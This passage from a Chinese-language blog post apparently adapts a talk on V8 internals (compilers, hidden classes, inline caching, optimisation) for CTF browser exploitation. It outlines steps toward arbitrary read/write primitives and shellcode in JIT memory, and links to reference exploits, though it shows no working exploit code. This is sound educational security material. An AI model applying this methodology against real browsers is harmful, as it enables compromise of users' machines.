cd v8&amp;&amp; gclient sync</span><br><span class="line">$ tools/dev/v8gen.py x64.debug</span><br><span class="line">$ ninja -C out.gn/x64.debug</span><br></pre></td></tr></table></figure></li><li><p>启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./out/x64.debug/d8</span><br><span class="line">$ ./out/x64.debug/shell</span><br></pre></td></tr></table></figure></li></ol><h2 id="关于js的问题"><a href="#关于js的问题" class="headerlink" title="关于js的问题"></a>关于js的问题</h2><h3 id="js引擎"><a href="#js引擎" class="headerlink" title="js引擎"></a>js引擎</h3><p>世界上有各类的js引擎，比较有名的有下面这几种。</p><p>浏览器 渲染引擎 js引擎</p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-05-06-144220.png" alt=""><br>其他的js引擎介绍可以在这里找到：<br><a href="https://blog.sessionstack.com/how-javascript-works-inside-the-v8-engine-5-tips-on-how-to-write-optimized-code-ac089e62b12e" target="_blank" rel="noopener">https://blog.sessionstack.com/how-javascript-works-inside-the-v8-engine-5-tips-on-how-to-write-optimized-code-ac089e62b12e</a></p><h3 id="js的pattern分为两类"><a href="#js的pattern分为两类" class="headerlink" title="js的pattern分为两类"></a>js的pattern分为两类</h3><ol><li>由patch引入的更多pattern<br>了解如何利用由patch所引发的新漏洞，用js来编写exp</li><li>过去的CVE<br>编译有漏洞的源码<br>在上一次和下一次commit之间找到正确的patch<br>有些情况下，PoC(attack code)会随着commit一起发布。<br>从修补程序中找出漏洞，并参考公开可用的PoC进行编写exp</li></ol><p>今天我们将解决pattern 1，但是它和解决pattern 2要做的是相似的。</p><h3 id="攻略方法"><a href="#攻略方法" class="headerlink" title="攻略方法"></a>攻略方法</h3><ol><li>创建一个用于调试的js环境版本<br>如果有一个包含漏洞的patch，hit和build它。</li><li>分析patch以确定哪个patch适用于哪个进程<br> Full-Codegen, Crankshaft, TurboFan, Ignition, AST, IC, …<br> Full-Codegen and Crankshaft do not exist in V8 as of 2018 (see below)</li><li>编写利用漏洞的js代码段<br> Think JavaScript code that causes patched parts to pass and causes bugs</li><li>创建一个任意地址读/写的原语<br> 主要使用ArrayBuffer和TypedArray</li><li>getshell<br> 由于这是Pwn类别的问题，getshell是第一目标。<br> 在JIT区域嵌入shell代码经常被使用</li></ol><p>今天的主题1是如何阅读v8和给出一些编写js exp的建议。<br>今天的主题2是我将介绍getshell的通用技术。</p><h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><p><img src="http://onc55v8te.bkt.clouddn.com/2018-05-06-154107.png" alt=""><br>问题出现在当时的v8，已经和现在大不相同。</p><ul><li>当时: Full-Codegen(JIT生成) + Crankshaft(优化1) + TurboFan(优化2)</li><li>现在: Ignition(JIT生成) + TurboFan(优化）</li></ul><p>然而对这个bug的学习依然有用。</p><p>要完成这个目标，我们需要掌握以下知识：</p><ol><li>编译器优化<br>触发optimize的条件</li><li>GC（垃圾回收）<br>GC的实现和触发条件</li><li>了解V8的内存结构和类型表示<br>Integer value, double value, pointer, character string, special value, array, ArrayBuffer, etc.</li></ol><p>供参考的exp:<br><a href="https://gist.github.com/sroettger/d077d3907999aaa0f89d11d956b438ea" target="_blank" rel="noopener">https://gist.github.com/sroettger/d077d3907999aaa0f89d11d956b438ea</a><br><a href="https://rzhou.org/~ricky/pctf2016/js_sandbox.js" target="_blank" rel="noopener">https://rzhou.org/~ricky/pctf2016/js_sandbox.js</a></p><h2 id="什么是v8？"><a href="#什么是v8？" class="headerlink" title="什么是v8？"></a>什么是v8？</h2><p>解释和执行js的引擎<br>由c++实现，parse js代码，构造AST<br>基于AST，JIT将其编译成汇编执行。</p><p>AST：a+b<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-06-161022.png" alt=""></p><p>在做v8 exp之前，首先我们需要知道v8的结构（你不需要知道所有的结构，因为它更新很快……）<br>但是你必须了解基本的概念。</p><p>在了解了这些之后，你就可以从Exploit的观点去深入</p><ul><li>如何实现任意地址读写？</li><li>如何稳定的利用？</li></ul><p>注意，我们主要讲解2016年4月的v8的结构，如果你想了解现在的v8，下面这些资料是十分有用的。<br><a href="https://www.slideshare.net/ssuser6f246f/v8-javascript-engine-for" target="_blank" rel="noopener">https://www.slideshare.net/ssuser6f246f/v8-javascript-engine-for</a><br><a href="https://speakerdeck.com/brn/source-to-binary-journey-of-v8-javascript-engine" target="_blank" rel="noopener">https://speakerdeck.com/brn/source-to-binary-journey-of-v8-javascript-engine</a></p><h2 id="v8的编译器和优化"><a href="#v8的编译器和优化" class="headerlink" title="v8的编译器和优化"></a>v8的编译器和优化</h2><h3 id="编译器的种类"><a href="#编译器的种类" class="headerlink" title="编译器的种类"></a>编译器的种类</h3><p>要理解v8，其中最重要的组件就是编译器。<br>内部大概分成四个编译器<br>旧的baseline编译器：Full-Codegen<br>旧的优化编译器：Crankshaft<br>新的优化编译器：TurboFan<br>新的baseline编译器：Ignition<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-06-162728.png" alt=""></p><p>下面这些资料可以用于参考：<br><a href="https://docs.google.com/presentation/d/1H1lLsbclvzyOF3IUR05ZUaZcqDxo7_-8f4yJoxdMooU/edit#slide=id.p" target="_blank" rel="noopener">An overview of the TurboFan compiler</a><br><a href="https://docs.google.com/presentation/d/1_eLlVzcj94_G4r9j9d_Lj5HRKFnq6jgpuPJtnmIBs88" target="_blank" rel="noopener">TurboFan: A new code generation architecture for V8</a></p><h3 id="编译器的历史"><a href="#编译器的历史" class="headerlink" title="编译器的历史"></a>编译器的历史</h3><p>最初，Full-Codegen直接生成和执行汇编语言<br>从AST直接生成汇编语言代码（JIT）相对较快，但是生成的汇编语言代码有很多冗杂部分，还有优化空间。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-07-025035.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-140512.png" alt=""></p><p>2010年，用于优化hot-code的Crankshaft被引入。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-07-025306.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-140547.png" alt=""></p><p>2015年，又引入了TurboFan，为了更好的适应新的javascript规范。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-07-030317.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-140712.png" alt=""></p><p>2017年，引入了生成中间语言(bytecode)的Ignition<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-07-030943.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-140742.png" alt=""></p><p>2018年至今，Full-Codegen和Crankshaft已经被从v8中移除。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-07-031037.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-140755.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-140822.png" alt=""></p><h3 id="今天的问题"><a href="#今天的问题" class="headerlink" title="今天的问题~"></a>今天的问题~</h3><p>2016年当时的latest<br>Hidden Class和Inline Caching也用作优化。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-07-032813.png" alt=""></p><h3 id="编译器和优化"><a href="#编译器和优化" class="headerlink" title="编译器和优化"></a>编译器和优化</h3><ul><li>baseline编译器<br>1.Full-Codegen 重要度低—&gt;对于理解这个exp的重要性</li><li>优化机制<br>2.Hidden Class 重要度中—&gt;更准确的说，Hidden Class是一种有助于自身加速的机制，而Inline Caching是一种基于Hidden Class信息进行优化的机制。<br>3.Inline Caching 重要度中</li><li>优化编译器<br>4.Crankshaft 重要度低<br>5.TurboFan 重要度高</li></ul><p><img src="http://onc55v8te.bkt.clouddn.com/2018-05-07-041132.png" alt=""><br>（顺便说一下）你应该知道的其他部分<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-07-041214.png" alt=""><br>api.cc、api.h：如果你想集成v8到你自己的程序，可以使用这里的API。<br>compiler/、compiler.cc、compiler.hh：编译起点是src/compiler.cc（从src/api.cc调用）<br>globals.h:常量和其他的定义<br>heap：GC<br>ic：Inline Caching<br>objects-ini.h、objects.cc、objects.h、type.cc、type.h: V8中使用的对象和类型的定义</p><h3 id="Full-Codegen"><a href="#Full-Codegen" class="headerlink" title="Full-Codegen"></a>Full-Codegen</h3><p>Full-Codegen中存在的机制：</p><ul><li>将AST转换为汇编语言<ul><li>它是一个JIT编译器<ul><li>JIT编译器：一种在软件执行时进行编译并提高执行速度的机制</li><li>通过它，v8把要执行的JavaScript代码转换为机器语言</li></ul></li><li>机器语言输出位于JIT区域（= RWX区域）<ul><li>将EIP寄存器移到这个JIT区域并按原样继续执行</li></ul></li><li>它尚未优化</li></ul></li></ul><p>它是一种与当前问题没有太大关系，并且不存在于最新代码中的机制，因此省略了细节</p><h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><ul><li>Full-Codegen生成的机器语言特性（半优化代码）<ul><li>生成速度快，但执行速度慢（造成浪费）</li></ul></li><li><p>因此，使用了根据需要来进行优化的机制</p><ul><li><p>优化1：缓存使用情况</p><ul><li>使用Hidden Class和Inline Caching<ul><li>缓存要调用的地址和要引用的偏移量</li></ul></li></ul></li><li><p>优化2：重新编译为更高效的JIT代码</p><ul><li>优化目标是在运行时确定的<ul><li>在主线程中，正常执行机器语言</li><li>在另一个线程中，Runtime-Profiler测量使用状态<ul><li>Runtime-Profiler：在程序执行时测量和统计执行状态的机制</li><li>根据测量结果判断是否优化</li></ul></li></ul></li><li>使用Crankshaft进行优化编译<ul><li>再次将源编译为机器语言，并将正在运行的机器语言替换掉</li></ul></li><li>使用TurboFan优化编译<ul><li>再次将源编译为机器语言，并将正在运行的机器语言替换掉</li></ul></li></ul></li></ul></li></ul><p><img src="http://onc55v8te.bkt.clouddn.com/2018-05-07-060921.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-07-061031.png" alt=""></p><h2 id="Hiddern-Class"><a href="#Hiddern-Class" class="headerlink" title="Hiddern Class"></a>Hiddern Class</h2><ol><li>每个property的值都以数组的形式进行管理。</li><li>通过偏移值访问数组里的property值</li></ol><p><img src="http://onc55v8te.bkt.clouddn.com/2018-05-07-123753.png" alt=""></p><p>偏移值被分开管理<br>将属性名称和偏移量的依赖关系保留给另一个类(Map类)<br>这个Map类被称作Hidden Class</p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-05-07-124009.png" alt=""></p><h3 id="Map生成"><a href="#Map生成" class="headerlink" title="Map生成"></a>Map生成</h3><p><img src="http://onc55v8te.bkt.clouddn.com/2018-05-07-124545.png" alt=""><br>①创建object的时刻（还没有property时），obj1内部指向C0<br>②创建一个没有property的map，type+offset管理，通常被称作C0<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-07-125133.png" alt=""><br>①当你添加obj1.x的时候，改变obj1内部指向C1<br>②通过向C0添加x的offset信息来创建新的map C1（map也有类型信息）<br>③在C0中添加转换条件<br>Map:C0<br>条件：当x加入时转移到C1</p><p>当访问obj1.x的值时，跟踪obj1所持有的指针，并引用C1以获取“x的偏移量为0”的信息。之后，通过访问obj 1的偏移量0处的值，可以高速的获得x的值。在C1内部，有必要寻找“x”，尽管我个人觉得它与哈希表似乎没有多大区别，但是这会让它更快。</p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-05-07-130350.png" alt=""><br>①当你添加obj1.y的时候，obj1在内部更改为指向C2<br>②通过向C1添加y的offset信息来创建新的map C2<br>③在C1中添加转换条件<br>条件：添加y时，转换到C2</p><p>此时C0和C1不再使用，但它们不会被移除，因为它们可能在将来被重新使用。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-07-130848.png" alt=""><br>对于具有完全相同属性的对象，如果你创建类似的对象，自然存在“x”和“y”，你可以使用创建的Map。<br>创建obj 2的时刻指向C0，但通过以与obj 1相同的方式按x和y的顺序添加属性，它遵循转换条件以完成C0-&gt;C1-&gt;C2<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-07-131159.png" alt=""><br><strong>注意：如果属性添加顺序不同，即使具有相同名称的属性的对象也将具有不同的转换条件。 因此，最终创建的map也会变成不同的map，并且无法获得加速的好处。<br>有关详细信息，请参阅<br><a href="http://richardartoul.github.io/jekyll/update/2015/04/26/hidden-classes.html" target="_blank" rel="noopener">http://richardartoul.github.io/jekyll/update/2015/04/26/hidden-classes.html</a><br>另外，如果property添加/删除次数增加太多，Hidden Class的管理会减慢。<br>因此，此时它不使用Hidden Class，而使用字典类型来管理<br><a href="https://v8project.blogspot.jp/2017/08/fast-properties.html" target="_blank" rel="noopener">https://v8project.blogspot.jp/2017/08/fast-properties.html</a></strong></p><h3 id="property的管理方法"><a href="#property的管理方法" class="headerlink" title="property的管理方法"></a>property的管理方法</h3><p>1.默认情况下,object的内部管理是通过array实现的</p><ul><li>In-Object property（这次的解说就是用这种方法）</li></ul><p>2.当property增加到11个以上，使用外部的array来管理。</p><ul><li>Fast property</li></ul><p>3.如果再进一步增加property，那么就用object外的dictory来管理</p><ul><li>slow/dict properties<ul><li>它也被称为self-contained，因为没有使用map且使用外部的dictory保存所有的信息</li><li>尽管实体是一个FixedArray的数组，但它被用作如下所示的字典<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-08-131813.png" alt=""></li></ul></li></ul><p>参考资料：<a href="https://v8project.blogspot.jp/2017/08/fast-properties.html" target="_blank" rel="noopener">https://v8project.blogspot.jp/2017/08/fast-properties.html</a></p><h3 id="我想在这里说的"><a href="#我想在这里说的" class="headerlink" title="我想在这里说的"></a>我想在这里说的</h3><ol><li>一个object(javascript中)有一个指向Map的指针<ul><li>正如我们稍后会看到的，object的前8个字节是一个指向Map的指针</li></ul></li><li>(JavaScript)object指向的map将根据状况改变<ul><li>在漏洞利用中，这不是一个可靠的指针</li></ul></li><li>相同的类型=Map的地址是相同的<ul><li>比较map的地址即可确定类型是否一致</li></ul></li></ol><h2 id="Inline-Caching"><a href="#Inline-Caching" class="headerlink" title="Inline Caching"></a>Inline Caching</h2><p>参考资料：</p><ul><li><a href="https://blog.ghaiklor.com/optimizations-tricks-in-v8-d284b6c8b183" target="_blank" rel="noopener">https://blog.ghaiklor.com/optimizations-tricks-in-v8-d284b6c8b183</a></li><li><a href="https://speakerdeck.com/brn/source-to-binary-journey-of-v8-javascript-engine" target="_blank" rel="noopener">https://speakerdeck.com/brn/source-to-binary-journey-of-v8-javascript-engine</a></li><li><a href="https://www.slideshare.net/ssuser6f246f/v8-javascript-engine-for" target="_blank" rel="noopener">https://www.slideshare.net/ssuser6f246f/v8-javascript-engine-for</a></li><li><a href="http://cs.au.dk/~jmi/VM/IC-V8.pdf" target="_blank" rel="noopener">http://cs.au.dk/~jmi/VM/IC-V8.pdf</a></li></ul><p>附注：其中部分我做了翻译，可以在这里找到</p><ul><li><a href="http://eternalsakura13.com/2018/06/16/nodefest_v8/">http://eternalsakura13.com/2018/06/16/nodefest_v8/</a></li></ul><h3 id="对于各个action，对类型进行缓存和优化的机制"><a href="#对于各个action，对类型进行缓存和优化的机制" class="headerlink" title="对于各个action，对类型进行缓存和优化的机制"></a>对于各个action，对类型进行缓存和优化的机制</h3><ol><li>这里所说的action可以表示下列任意一种<pre><code>- 参照，代入（LoadIC, StoreIC)- 数组访问（KeyedLoadIC，KeyedStoreIC）- 二项演算 (BinaryOpIC）**最近的V8中被去掉了？**- 函数调用（CallIC）- 比较（CompareIC)- 布尔化(ToBooleanIC) **最近的V8中被去掉了？**</code></pre></li><li>某些action的jit code被多次调用时需要考虑的<ul><li>循环和函数多次传递相同的JIT code</li></ul></li><li>在执行JIT代码时着眼于操作目标的类型（≒参数）<ul><li>JIT code很可能与上次通过时的操作类型相同</li><li>例如，以下JavaScript代码显示重复相同类型的操作<ul><li>即使对应每个JIT代码，这个推断也应该保持不变<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (var i=<span class="number">0</span>;</span><br><span class="line">    i&lt;<span class="number">10000</span>;    <span class="comment">// 也许一个integer被从i载入，它是很可能去进行integer和integer的比较</span></span><br><span class="line">    i++)        <span class="comment">// 进行整数相加的可能性很大，i可能用一个整数去代替</span></span><br><span class="line">&#123;</span><br><span class="line">    var j =        <span class="comment">// j可能是被赋值为整数</span></span><br><span class="line">            <span class="number">100</span>*i; <span class="comment">// 也许一个整数会从i加载，它是很可能去进行整数相乘</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ol><p><img src="http://onc55v8te.bkt.clouddn.com/2018-05-08-135721.png" alt=""></p><ol><li><p>JavaScript类型=map地址</p><ul><li>从Hidden Class实现中可以看到，如果是相同类型，那么Map地址是相同的。</li><li>缓存类型意味着将map地址嵌入到JIT code中</li><li>例如，加载obj.x时的IC具有以下image<ul><li>将x的偏移值一起缓存</li><li>当map匹配时，直接由缓存的x的偏移值得到property x的值，并返回。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    mov  ecx, &quot;x&quot;</span><br><span class="line">    mov  eax, obj</span><br><span class="line">    cmp  [eax + kMapOffset], &lt;被缓存的map地址&gt;</span><br><span class="line">    jne  MISS</span><br><span class="line">    mov  eax, [eax + kPropertiesOffset]</span><br><span class="line">    mov  eax, [eax + 被缓存的&quot;x&quot;（通过hidden class获得）的offset]</span><br><span class="line">    jmp  DONE</span><br><span class="line">MISS:</span><br><span class="line">    call IC_Miss// 抄近路失败，根据本来的code来获得&quot;x&quot;的offset</span><br><span class="line">DONE:</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p>实际上，由于有多个Map被注册的情况，所以需要进行函数化<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-08-142505.png" alt=""><br>箭头1：当第二个map被注册时<br>箭头2：当第三个map被注册时</p></li><li><p>IC[存储了/持有]State</p><ul><li>UNINITIALIZED(0): 未初始化</li><li>PREMONOMORPHIC(.): 只被执行一次的情况，还没进行IC</li><li>MONOMORPHIC(1): IC注册一个的状态（快速）</li><li>POLYMORPHIC(P): IC注册两个以上的状态（一般的快）</li><li>MEGAMORPHIC(N): IC注册多个的状态</li><li>GENERIC(G):IC已停止的状态<br><strong>括号里是对于之后所说的debug输出（–trace-ic）的省略的标注</strong></li><li>基本上是从上到下进行迁移的(0-&gt;.-&gt;1-&gt;P-&gt;N-&gt;G)<ul><li>有些直接从0→1，如CallIC等</li></ul></li></ul></li><li>Inline Caching可通过-trace-ic进行确认<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-08-143709.png" alt=""></li><li>使用–use-ic启用IC（默认），使用–no-use-ic禁用</li></ol><h3 id="关于inline-caching"><a href="#关于inline-caching" class="headerlink" title="关于inline caching"></a>关于inline caching</h3><p>到目前为止说过的东西：</p><ul><li>它与Hidden Class配对，对hign speed有很大的贡献</li><li>但是在exploit观点，只需缓存在JIT中的地址和偏移量即可</li><li>由于很难创建任意地址读/写的原语，因此与exploit的兼容性不是很好</li><li>但是，有些情况下应该部分简化IC检查（例如边界检查）<ul><li>因此，在非IC下不会引发的漏洞可能会在IC下触发</li></ul></li></ul><h2 id="优化-1"><a href="#优化-1" class="headerlink" title="优化"></a>优化</h2><h3 id="Crankshaft和TurboFan"><a href="#Crankshaft和TurboFan" class="headerlink" title="Crankshaft和TurboFan"></a>Crankshaft和TurboFan</h3><p>两种编译器都可以用于优化</p><ul><li><p>如何调用优化</p><ul><li>hot-code，也就是说，它是一个多次调用的函数或循环<ul><li>优化由函数单元或循环单元执行</li><li>与主线程中并行执行，runtime-profiler在另一个线程中计数并作出判断</li><li>它也取决于函数和循环的代码段大小，但如果调用大约1000次或10000次左右，它将成为优化目标<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">f</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;<span class="comment">// hot-code(都有成为hot-code的可能性)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (var i=<span class="number">0</span>; i&lt;<span class="number">10000</span>; i++) &#123;</span><br><span class="line">    func(); <span class="comment">// hot-code(都有成为hot-code的可能性)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p>被判断为hot-code的话</p><ul><li>turbofan/crankshart会在其他线程里再次编译（hot-code的）所属区域（的代码）<ul><li>但是，hot-code不被最优化的情况也是存在的</li></ul></li><li>通过替换机器语言的jmp目标地址（在主线程中执行）来切换以执行优化的机器语言，</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">将函数切换为优化代码时，可以将指针更新为函数对象的JIT区域</span><br><span class="line"><span class="function">function <span class="title">f</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;<span class="comment">// hot-code(都有成为hot-code的可能性)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (var i=<span class="number">0</span>; i&lt;<span class="number">10000</span>; i++) &#123;</span><br><span class="line">    func(); <span class="comment">// hot-code(都有成为hot-code的可能性)</span></span><br><span class="line">&#125;</span><br><span class="line">在循环中，当从中间切换到优化代码时，可以将jmp目标切换到循环的顶部，但仍然存在名为OSR（On-Stack-Replacement）的切换方法。</span><br><span class="line">但这里省略，参考这篇文章：https:<span class="comment">//wingolog.org/archives/2011/06/20/on-stack-replacement-in-v8）</span></span><br></pre></td></tr></table></figure><ul><li>最优化编译器的使用条件（主要的）<ol><li>未优化的语法不在函数/循环中使用<ul><li>debugger语句，eval语句，等等</li></ul></li><li>如果有“use asm”语句，则使用TurboFan<ul><li>只有TurboFan可以优化asm.js</li></ul></li><li>如果有Crankshaft不支持的语法，则将使用TurboFan<ul><li>try catch，with等</li></ul></li><li>Crankshaft被默认使用<ul><li>这是2016年的情况，现在Crankshaft被移除。</li></ul></li></ol></li></ul><h3 id="Crankshaft"><a href="#Crankshaft" class="headerlink" title="Crankshaft"></a>Crankshaft</h3><p>Crankshaft的特点</p><ul><li>Type-feeback<ul><li>通过使用runtime-profiler收集的信息，确定类型来加快速度</li><li>最终生成的优化代码包含一个类型检查</li><li>当它不能确定类型时，它将返回到优化前的代码。</li></ul></li><li>Hydrogen (optimization by high-level intermediate representation (HIR))<ul><li>AST以SSA格式表示</li><li>各种优化，比如将loop内部不变的变量移到loop外。</li></ul></li><li>lithium（Optimization by Low-Level Intermediate Representation (LIR)）<ul><li>快速的寄存器分配算法</li><li>依赖CPU的优化，code生成</li></ul></li></ul><p><strong>因为，它是一种与当前问题没有太大关系并且不存在于最新代码中的机制，因此省略了细节。<br>如果需要了解细节，可以参考这篇文章：<a href="http://nothingcosmos.github.io/V8Crankshaft/src/blog.html" target="_blank" rel="noopener">http://nothingcosmos.github.io/V8Crankshaft/src/blog.html</a></strong></p><h3 id="TurboFan"><a href="#TurboFan" class="headerlink" title="TurboFan"></a>TurboFan</h3><p>参考资料：<br><a href="https://github.com/v8/v8/wiki/TurboFan" target="_blank" rel="noopener">https://github.com/v8/v8/wiki/TurboFan</a><br><a href="https://speakerdeck.com/brn/source-to-binary-journey-of-v8-javascript-engine" target="_blank" rel="noopener">https://speakerdeck.com/brn/source-to-binary-journey-of-v8-javascript-engine</a><br><a href="https://docs.google.com/presentation/d/1H1lLsbclvzyOF3IUR05ZUaZcqDxo7_-8f4yJoxdMooU/edit#slide=id.p" target="_blank" rel="noopener">https://docs.google.com/presentation/d/1H1lLsbclvzyOF3IUR05ZUaZcqDxo7_-8f4yJoxdMooU/edit#slide=id.p</a></p><h4 id="TurboFan全览"><a href="#TurboFan全览" class="headerlink" title="TurboFan全览"></a>TurboFan全览</h4><p>下图显示了截至2018年TurboFan的整体情况<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-10-012951.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-10-013055.png" alt=""></p><h4 id="TurboFan的特征"><a href="#TurboFan的特征" class="headerlink" title="TurboFan的特征"></a>TurboFan的特征</h4><ul><li>Graph Building<ul><li>从AST创建一个JavaScript节点的graph<ul><li>JSAdd，JSCallFunction，JSLoadProperty，IfTrue，IfFalse等等</li></ul></li><li>在making graphs优化</li></ul></li><li>Optimization<ul><li>graph的各种优化</li></ul></li><li>Code Generation<ul><li>机器码生成</li></ul></li></ul><h4 id="TurboFan优化"><a href="#TurboFan优化" class="headerlink" title="TurboFan优化"></a>TurboFan优化</h4><ul><li>src/compiler/pipeline.cc参考<ul><li>inline<br>内联函数调用</li><li>trimming<br>未到达节点删除</li><li>type<br>类型推断</li><li>typed-lowering<br>根据类型将表达式和指令替换为更简单的处理</li><li>loop-peeling<br>取出循环内的处理。</li><li>loop-exit-elimination<br>删除Loop Exit</li><li>load-elimination<br>删除不必要的读取和检查</li><li>simplified-lowering<br>用更具体的值来进行指令的简单转换</li><li>generic-lowering<br>将JS前缀指令转换为更简单的调用和stub调用</li><li>dead-code-elimination<br>删除无法访问的代码</li></ul></li></ul><p><img src="http://onc55v8te.bkt.clouddn.com/2018-05-10-081152.png" alt=""></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-05-10-082624.png" alt=""><br>文本框中的文字如下：<br><strong>细节</strong><br>出于某种原因，在名为GenerateCode()的函数中执行了对类型和graph的各种优化。<br>此外，尽管从CreateGraph()调用GenerateCode()，但这些函数原本应该是独立的。(在代码中还有三个独立的部分，job-&gt; CreateGraph()，job-&gt; OptimizeGraph()，job-&gt; GenerateCode()）<br>实际上，在V8的这个时间段中，每个phase都没有完全分离，因为优化和代码生成都是在CreateGraph()函数内部实现的。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-10-082716.png" alt=""></p><h4 id="Crankshaft-TurboFan检查"><a href="#Crankshaft-TurboFan检查" class="headerlink" title="Crankshaft/TurboFan检查"></a>Crankshaft/TurboFan检查</h4><ul><li>Crankshaft/TurboFan能够被确认使用，通过–trace-opt<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-10-084845.png" alt=""><br>上面框：大约调用函数10000次<br>下面框：Crankshaft被使用</li></ul><p><img src="http://onc55v8te.bkt.clouddn.com/2018-05-10-085002.png" alt=""><br>Crankshaft不能对包含with语句的函数进行优化，所以如果你在函数后添加add语句，TurboFan将会被调用。</p><ul><li><p>TurboFan还可以通过 –turbo-stats查看优化列表和统计数据<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-10-085250.png" alt=""></p></li><li><p>Confirm results with d8 –print_code等<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-10-085453.png" alt=""><br>Crankshaft, TurboFan, Inline Caching related, etc. can be confirmed considerably</p></li></ul><h3 id="编译器调用的流程"><a href="#编译器调用的流程" class="headerlink" title="编译器调用的流程"></a>编译器调用的流程</h3><h4 id="被调用"><a href="#被调用" class="headerlink" title="被调用"></a>被调用</h4><ul><li>参考samples/hello-world.cc<ul><li>它只涵盖main()<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-10-090144.png" alt=""><br>有各种各样的东西，但最重要的是Compile()和Run()</li></ul></li></ul><h4 id="调用堆栈查看"><a href="#调用堆栈查看" class="headerlink" title="调用堆栈查看"></a>调用堆栈查看</h4><ul><li><p>如何调用Full-Codegen</p><ul><li>描述了调用Compile函数时的转换<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-10-091306.png" alt=""></li></ul><ol><li>如果它是最新的源代码，它会跳转到ParseProgram()而不是ParseStatic()，但它不会有太大的改变，因为它最终会达到AST方向。</li><li>如果它是最新的源代码，它将跳转到GenerateUnoptimizedCode（）而不是CompileBaselineCode（），并使用Ignition注册编译作业。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-10-091654.png" alt=""></li></ol></li><li><p>调用Run()函数时的转换如下<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-10-092236.png" alt=""><br>CALL_GENERATED_CODE是一个宏，通过这个宏，在跳转到由Full-Codegen生成的机器语言（JIT）的阶段，优化编译器不会被调用</p></li><li>如何调用Crankshaft / TurboFan<ul><li>Called after runtime-profiler decides whether optimization is possible<ul><li>Optimization availability determination is done automatically in another thread during Run ()<ul><li>因此，使用V8作为库的程序员<strong>基本上不会主动调用执行优化的函数</strong></li><li>当然，开发V8的程序员有可能自己故意调用一个根据选项执行优化的函数，但你在exploit的角度不用去考虑它。</li></ul></li></ul></li></ul></li></ul><p><img src="http://onc55v8te.bkt.clouddn.com/2018-05-10-092812.png" alt=""><br>在确定使用UseTurboFan()的优化编译器后，将创建Crankshaft / TurboFan作业。<br>之后，job-&gt;CreateGraph()实际触发优化编译</p><h2 id="阅读V8的源码"><a href="#阅读V8的源码" class="headerlink" title="阅读V8的源码"></a>阅读V8的源码</h2><p>在exploit中，您还需要阅读源代码.<br>源代码(samples/hello-world.cc),我们还介绍了用于阅读和调试源代码的重要概念<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-10-121221.png" 